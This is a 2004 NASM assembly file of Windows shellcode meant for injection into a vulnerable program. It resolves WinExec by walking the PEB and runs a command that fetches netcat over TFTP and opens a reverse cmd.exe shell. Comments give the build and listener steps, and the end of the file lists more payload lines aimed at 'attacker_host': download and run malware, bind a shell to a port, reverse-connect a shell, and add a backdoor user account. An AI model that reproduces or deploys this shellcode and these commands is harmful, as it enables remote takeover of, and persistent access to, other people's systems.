;	Execute command..this example downloads nc.exe (Netcat) and connects to
;	localhost (127.0.0.1) port 2004 executing cmd.exe which is exactly
;	like reverse-callback shell code.
;	
;	Have TFTP server listening with nc.exe in server directory.
;	Check 29A#6 -> Binaries\Z0MBiE\TFTPSERV.ZIP
; 
;	Have netcat listen locally on port 2004.
;	Like:
;		nc -vLp 2004 127.0.0.1
;	you can probably find netcat on packetstorm, use search engine.
;	
;	When code runs, if all goes well, system should connect and download 
;	nc.exe from 127.0.0.1 and execute Netcat, which should then connect to
;	127.0.0.1 finally spawning cmd prompt.
;	
;	software being exploited will probably no doubt crash after execution,so
;	the rest is up to you.
;	You'll notice write of code section..i'm assuming its writeable
;	when in some memory.
;
;	Size -> 151 bytes
;	
;	nasm -f bin win_exec.asm -o win_exec.bin
;
;	May 2004  / bcom@hushmail.com
;
;
bits 32

section .text
global entry_point

entry_point:
	xor	ecx, ecx			; for WinExec
	push	dword 0c356515eh		; "pop esi/push ecx/push esi/ret"	push ecx = first param to WinExec
	mov	eax, esp
	call	eax
	add	esi, byte 9			; skip 9 bytes of code
	push	esi				; second part of WinExec parameter
	;inc	byte [esi + nCmdLen - 1]
	db	0FEh,046h,045h		; NASM Uses 32-bit displacement, when we only want 8
	jmp	short $+nCmdLen+2		; but if 3 bytes means no big deal, uncomment before INC BYTE .. 
	;=====================		; and remove opcode below it...dont 4get, if cmd line changed, opcode
szCmd:					; needs changing ;)
	db	"cmd /c tftp -i 127.0.0.1 GET nc.exe nc.exe && nc 127.0.0.1 2004 -ecmd",0ffh
nCmdLen	equ	$-szCmd
	;=====================
	mov	cl, 30h
	mov	eax, [fs:ecx]
	mov	eax, [eax + 0ch]
	mov	esi, [eax + 1ch]
	lodsd
	mov	ebx, [eax + 08h]
	;=====================
	mov	eax, [ebx + 3ch]
	mov	eax, [ebx + eax + 78h]
	lea	esi, [ebx + eax + 1ch]
	mov	cl, 03h
load_rva:
	lodsd
	add	eax, ebx
	push	eax
	loop	load_rva
	pop	edx
	pop	esi
	mov	eax, 'EniW'			; WinExec
scan_apis:
	mov	edi, [esi + 4 * ecx]
	add	edi, ebx
	inc	ecx
	scasd
	jne	scan_apis
	dec	ecx
	pop	esi
	movzx	eax, word [edx + 2 * ecx]
	add	ebx, [esi + 4 * eax]
	call	ebx
exit_point:
	;					; do something here to avoid crash.
; other commands you could use are:
;cmd /c tftp -i attacker_host GET malware.exe && malware.exe		; download & execute file
;cmd /c tftp -i attacker_host GET nc.exe nc.exe && nc -Lp2004 -ecmd	; bind cmd to port 2004
;cmd /c net user h4x0r 31337 /add ; add username to SAM database
; and again of course..
;cmd /c tftp -i attacker_host GET nc.exe nc.exe && nc attacker_host 2004 -ecmd	; reverse-connect cmd port 2004